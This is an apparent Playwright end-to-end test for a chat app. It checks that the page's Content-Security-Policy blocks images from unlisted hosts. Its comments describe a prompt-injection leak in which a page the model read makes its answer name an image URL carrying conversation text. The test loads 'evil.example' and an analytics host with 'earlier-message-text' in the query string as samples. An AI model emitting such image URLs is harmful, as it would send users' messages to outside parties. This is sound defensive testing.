// e2e-product: @chat
// e2e-area: @turn
import { test, expect, type Page } from './helpers/test';

// A page the model read can steer its answer, and any image that answer names is
// fetched the moment the answer renders, carrying whatever the model put in the URL (CUR-1898). The renderer
// turns a remote image into a link (marked.spec.ts); the page's img-src/media-src CSP is the
// backstop for anything that slips past it. These check the backstop on the deployed build: every
// image the page itself loads comes from a host the policy names, and an image pointed anywhere
// else is refused before a request leaves the browser.

async function policyOf(page: Page, path: string): Promise<string> {
	const response = await page.goto(path, { waitUntil: 'networkidle' });
	const header = response?.headers()['content-security-policy'];
	if (header) return header;
	// A prerendered page carries its policy in a <meta> tag instead of a header.
	return (
		(await page
			.locator('meta[http-equiv="content-security-policy"]')
			.getAttribute('content', { timeout: 1_000 })
			.catch(() => null)) ?? ''
	);
}

function sourcesFor(policy: string, directive: string): string[] {
	const entry = policy
		.split(';')
		.map((part) => part.trim().split(/\s+/))
		.find(([name]) => name === directive);
	return entry ? entry.slice(1) : [];
}

function allows(sources: string[], url: string, pageOrigin: string): boolean {
	const u = new URL(url);
	if (u.protocol === 'data:' || u.protocol === 'blob:') return sources.includes(u.protocol);
	if (u.origin === pageOrigin && sources.includes("'self'")) return true;
	return sources.some((source) => {
		if (!source.startsWith('https://')) return false;
		const host = source.slice('https://'.length);
		if (host.startsWith('*.')) return u.protocol === 'https:' && u.host.endsWith(host.slice(1));
		return u.protocol === 'https:' && u.host === host;
	});
}

for (const path of ['/', '/chat']) {
	test(
		`${path} loads images and media only from hosts its CSP names, and refuses an image pointed anywhere else`,
		{ tag: ['@CUR-1898'] },
		async ({ page }) => {
			test.setTimeout(90_000);
			const requested: { type: string; url: string }[] = [];
			page.on('request', (request) => {
				const type = request.resourceType();
				if (type === 'image' || type === 'media') requested.push({ type, url: request.url() });
			});
			// Chromium raises `request` even for one the CSP stops, then fails it with
			// a failure Playwright names "csp"; only that failure means nothing left the browser.
			const outcome = new Map<string, string>();
			page.on('requestfailed', (request) =>
				outcome.set(request.url(), request.failure()?.errorText ?? 'failed')
			);
			page.on('requestfinished', (request) => outcome.set(request.url(), 'finished'));

			const policy = await policyOf(page, path);
			const imgSrc = sourcesFor(policy, 'img-src');
			const mediaSrc = sourcesFor(policy, 'media-src');
			expect(imgSrc, `no img-src in ${path}'s CSP: "${policy}"`).not.toHaveLength(0);
			expect(mediaSrc, `no media-src in ${path}'s CSP: "${policy}"`).not.toHaveLength(0);
			expect(imgSrc, 'a bare https: or * in img-src lets any host through').not.toContain('*');
			expect(imgSrc).not.toContain('https:');

			const origin = new URL(page.url()).origin;
			expect(
				requested.length,
				`${path} loaded no images, so the allowlist check proves nothing`
			).toBeGreaterThan(0);
			for (const { type, url } of requested) {
				expect(
					allows(type === 'media' ? mediaSrc : imgSrc, url, origin),
					`${path} requested ${type} ${url}, which its CSP does not allow`
				).toBe(true);
			}

			// The case the policy exists for: an <img> naming another host, carrying data in its URL.
			// The control image beside it is our own, so a pass cannot come from injection not working.
			const result = await page.evaluate(async () => {
				const violations: string[] = [];
				document.addEventListener('securitypolicyviolation', (event) => {
					violations.push(`${event.effectiveDirective} ${event.blockedURI}`);
				});
				const load = (src: string) =>
					new Promise<boolean>((resolve) => {
						const img = document.createElement('img');
						img.onload = () => resolve(true);
						img.onerror = () => resolve(false);
						img.src = src;
						document.body.append(img);
					});
				const remote = await load('https://evil.example/x.png?d=earlier-message-text');
				// An analytics ingest host records an event sent as an image's query string, so it
				// counts as another host however familiar it looks.
				const ingest = await load('https://us.i.posthog.com/e/?data=earlier-message-text');
				const own = await load('/favicon.svg');
				return { remote, ingest, own, violations };
			});
			expect(
				result.own,
				'our own /favicon.svg did not load, so the injection itself is broken'
			).toBe(true);
			expect(result.remote, 'the remote image loaded').toBe(false);
			// PostHog answers with JSON, so this image fails to load either way; the violation below is what
			// shows the request never left.
			expect(
				result.violations.some((v) => v.startsWith('img-src https://us.i.posthog.com')),
				`the browser did not report an img-src violation for us.i.posthog.com: ${JSON.stringify(result.violations)}`
			).toBe(true);
			expect(
				result.violations.some((v) => v.startsWith('img-src https://evil.example')),
				`the browser did not report an img-src violation for evil.example: ${JSON.stringify(result.violations)}`
			).toBe(true);
			for (const { url } of requested.filter(({ url }) =>
				['evil.example', 'us.i.posthog.com'].includes(new URL(url).host)
			)) {
				await expect
					.poll(() => outcome.get(url), {
						message: `${url} was not stopped by the CSP before it left the browser`
					})
					.toBe('csp');
			}
		}
	);
}
